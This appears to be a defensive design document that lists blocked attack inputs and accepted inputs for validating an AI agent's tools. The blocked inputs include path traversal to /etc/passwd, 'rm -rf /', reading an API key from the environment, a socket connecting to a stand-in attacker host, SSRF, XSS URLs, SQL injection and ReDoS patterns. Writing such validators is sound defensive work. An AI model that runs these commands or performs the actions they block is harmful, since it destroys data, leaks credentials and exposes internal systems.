# Parameter Validation Examples: Bad vs Good Input

## Tool 1: WorkspaceFileInput (Path Traversal Prevention)

### ❌ BAD INPUT (Blocked)

```python
# Attack 1: Directory traversal
{
  "command": "read",
  "path": "../../../../etc/passwd"
}
# Reason: Path escapes /workspace/ directory
# Validation: regex check fails: ^/workspace/[^/].*|workspace/.*

# Attack 2: Absolute path escape
{
  "command": "read",
  "path": "/etc/passwd"
}
# Reason: Must be relative to workspace
# Validation: path must start with "workspace/" or "/workspace/"

# Attack 3: UNC path (Windows network share)
{
  "command": "read",
  "path": "\\\\attacker.com\\share\\secrets.txt"
}
# Reason: UNC paths are network attack vector
# Validation: rejects paths matching \\\\.*\\.*

# Attack 4: Null byte injection
{
  "command": "read",
  "path": "workspace/legit.txt\x00.txt"
}
# Reason: Null byte could truncate path in C library
# Validation: rejects any \x00 bytes

# Attack 5: Symlink attack
{
  "command": "read",
  "path": "workspace/symlink_to_etc_passwd"
}
# Reason: Path exists but points outside workspace
# Validation: os.path.realpath(path) must start with /workspace/
```

### ✅ GOOD INPUT (Accepted)

```python
# Legitimate: Read workspace file
{
  "command": "read",
  "path": "workspace/out/report.md"
}
# Passes: path is within /workspace/, no traversal

# Legitimate: Write with subdirectories
{
  "command": "write",
  "path": "workspace/out/results/2026_04_12.json",
  "content": "{...}"
}
# Passes: /workspace/out/results/ is whitelisted subdirectory

# Legitimate: Read from /in folder (input workspace)
{
  "command": "read",
  "path": "workspace/in/data.csv"
}
# Passes: /workspace/in is readable
```

---

## Tool 2: NetworkAuditScanNetworkInput (RFC1918 Validation)

### ❌ BAD INPUT (Blocked)

```python
# Attack 1: Scan entire public internet
{
  "command": "scan_network",
  "network": "0.0.0.0/0"
}
# Reason: Could be used for reconnaissance of any network
# Validation: rejects /0, /1, /2, /3 CIDR blocks

# Attack 2: Scan public IP range (external host)
{
  "command": "scan_network",
  "network": "8.8.8.8/32"
}
# Reason: Not in RFC1918 private ranges
# Validation: IP must match 10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16

# Attack 3: Scan internal corporate network (not local)
{
  "command": "scan_network",
  "network": "10.0.0.0/8"
}
# Reason: Even though private, could scan entire corporate network
# Validation: CIDR must be /24 or larger (limits to local subnets)

# Attack 4: Port number as DoS vector
{
  "command": "scan_network",
  "network": "192.168.1.0/24",
  "ports": "1-65535"
}
# Reason: Full port scan on large subnet could be DoS
# Validation: max 100 ports, defaults to top-1000

# Attack 5: Timeout abuse
{
  "command": "scan_network",
  "network": "192.168.1.0/24",
  "timeout_seconds": 300
}
# Reason: Could hang resources indefinitely
# Validation: timeout capped at 30 seconds
```

### ✅ GOOD INPUT (Accepted)

```python
# Legitimate: Scan local subnet
{
  "command": "scan_network",
  "network": "192.168.1.0/24"
}
# Passes: Private RFC1918 range, reasonable CIDR

# Legitimate: Scan with top 1000 ports (default)
{
  "command": "scan_network",
  "network": "10.0.50.0/24",
  "ports": "top1000"
}
# Passes: Default safe port list

# Legitimate: Scan specific hosts only
{
  "command": "scan_network",
  "network": "192.168.1.100/32",
  "timeout_seconds": 10
}
# Passes: Single host, reasonable timeout
```

---

## Tool 3: CDPNavigateInput (URL Scheme Validation)

### ❌ BAD INPUT (Blocked)

```python
# Attack 1: JavaScript execution
{
  "url": "javascript:alert('xss')"
}
# Reason: javascript: scheme allows code execution in browser
# Validation: scheme whitelist allows only http/https

# Attack 2: File access
{
  "url": "file:///etc/passwd"
}
# Reason: file:// scheme could read local files
# Validation: scheme must be http or https

# Attack 3: Data URI injection
{
  "url": "data:text/html,<script>alert('xss')</script>"
}
# Reason: data: URIs execute embedded code
# Validation: scheme whitelist blocks data:

# Attack 4: Protocol handler abuse
{
  "url": "ftp://attacker.com/backdoor.exe"
}
# Reason: FTP could be used to retrieve malicious files
# Validation: only http/https allowed

# Attack 5: Redirect to internal IP
{
  "url": "https://127.0.0.1:8000/admin"
}
# Reason: SSRF attack to access internal services
# Validation: IP must not be localhost/private (or blocked list)
```

### ✅ GOOD INPUT (Accepted)

```python
# Legitimate: Navigate public website
{
  "url": "https://example.com/page"
}
# Passes: https scheme, public domain

# Legitimate: Navigate with query params
{
  "url": "https://api.example.com/search?q=query&limit=10"
}
# Passes: https, valid URL format

# Legitimate: Navigate to localhost dev server (if whitelisted)
{
  "url": "http://localhost:3000/dashboard"
}
# Passes: localhost allowed in dev config
```

---

## Tool 4: PythonInterpreterInput (Code Injection Prevention)

### ❌ BAD INPUT (Blocked)

```python
# Attack 1: Import system module
{
  "code": "import os; os.system('rm -rf /')"
}
# Reason: System calls could delete/modify files
# Validation: blocks import of os, sys, subprocess, socket, etc.

# Attack 2: Read environment variables (credential theft)
{
  "code": "import os; os.environ['OPENROUTER_API_KEY']"
}
# Reason: Could leak credentials
# Validation: blocks access to os.environ

# Attack 3: Network exfiltration
{
  "code": "import socket; s = socket.socket(); s.connect(('attacker.com', 443))"
}
# Reason: Could exfiltrate data to attacker server
# Validation: blocks socket, requests, urllib imports

# Attack 4: File read/write escape
{
  "code": "open('/etc/passwd', 'r').read()"
}
# Reason: Could read sensitive files outside workspace
# Validation: file operations restricted to /workspace/ only

# Attack 5: Code size DoS
{
  "code": "x = " + "1 + " * 10000000 + "1"
}
# Reason: Could exhaust CPU/memory
# Validation: code length capped at 10,000 characters

# Attack 6: Eval/exec recursion
{
  "code": "exec(compile(open('malicious.py').read(), 'malicious.py', 'exec'))"
}
# Reason: Dynamic code loading/execution
# Validation: blocks exec, eval, compile, __import__
```

### ✅ GOOD INPUT (Accepted)

```python
# Legitimate: Math calculation
{
  "code": "import math; result = math.sqrt(16)"
}
# Passes: math module is whitelisted

# Legitimate: Data processing
{
  "code": "import json; data = json.loads('{\"key\": \"value\"}')"
}
# Passes: json module is whitelisted (no side effects)

# Legitimate: File read within workspace
{
  "code": "with open('workspace/out/data.json') as f: data = json.load(f)"
}
# Passes: File in /workspace/ is allowed
```

---

## Tool 5: ApexAnalyzerInput (ReDoS Prevention)

### ❌ BAD INPUT (Blocked)

```python
# Attack 1: Pathological regex (ReDoS)
{
  "soql_query": "SELECT Id FROM Account WHERE Name LIKE '%' + ('a' * 1000) + 'z%'"
}
# Reason: Could cause exponential regex backtracking
# Validation: Pattern complexity analyzed; rejected if likely ReDoS

# Attack 2: SQL injection
{
  "soql_query": "SELECT Id FROM Account WHERE Id = '1 OR '1'='1"
}
# Reason: Could bypass Apex filtering
# Validation: SOQL syntax validation; quote nesting checked

# Attack 3: Nested quantifiers (worst ReDoS pattern)
{
  "soql_query": "SELECT Id FROM Account WHERE Name MATCHES '(a+)+b'"
}
# Reason: (a+)+ is classic ReDoS exponential case
# Validation: nested quantifiers detected and blocked

# Attack 4: Query length bomb
{
  "soql_query": "SELECT " + ", ".join(["Id"] * 100000) + " FROM Account"
}
# Reason: Could exhaust parser
# Validation: query length capped at 4000 chars
```

### ✅ GOOD INPUT (Accepted)

```python
# Legitimate: Simple query
{
  "soql_query": "SELECT Id, Name FROM Account WHERE Industry = 'Technology'"
}
# Passes: Simple SOQL, no dangerous patterns

# Legitimate: Query with reasonable complexity
{
  "soql_query": "SELECT Id, Name, (SELECT Email FROM Contacts) FROM Account LIMIT 100"
}
# Passes: Subquery is reasonable complexity
```

---

## Summary Table

| Tool | Bad Example | Good Example | Block Reason |
|------|---|---|---|
| **WorkspaceFile** | `../../../../etc/passwd` | `workspace/out/report.md` | Path traversal escape |
| **NetworkAudit** | `0.0.0.0/0` | `192.168.1.0/24` | Public network scan |
| **CDP** | `javascript:alert()` | `https://example.com` | Code execution |
| **PythonInterp** | `import os; os.system()` | `import math; math.sqrt()` | System access |
| **ApexAnalyzer** | `(a+)+b` regex | `SELECT * FROM Account` | ReDoS explosion |

---

## False Positive Examples (What Gets Flagged Unfairly)

**These GOOD inputs might initially trigger false positives:**

1. **Legitimate but unusual path:**
   ```python
   "workspace/out/../../workspace/in/data.csv"  # Circular but valid
   # Solution: canonicalize path, then check
   ```

2. **Long legitimate parameter:**
   ```python
   "code": "# 9,999-character Python script calculating prime numbers..."
   # Solution: measure actual code, not comments
   ```

3. **Edge case in regex:**
   ```python
   "SELECT Id FROM Account WHERE Name MATCHES '^[a-zA-Z0-9]*$'"
   # Looks suspicious but is safe simple pattern
   # Solution: measure complexity score, not just presence
   ```

---

## Takeaway

**Validation approach:** Whitelist everything, explicit rules per tool  
**False positives:** Tunable thresholds, logged to Tap for visibility  
**False negatives:** Unlikely (whitelist is strict)  
**User experience:** Clear error messages explaining why input was rejected  

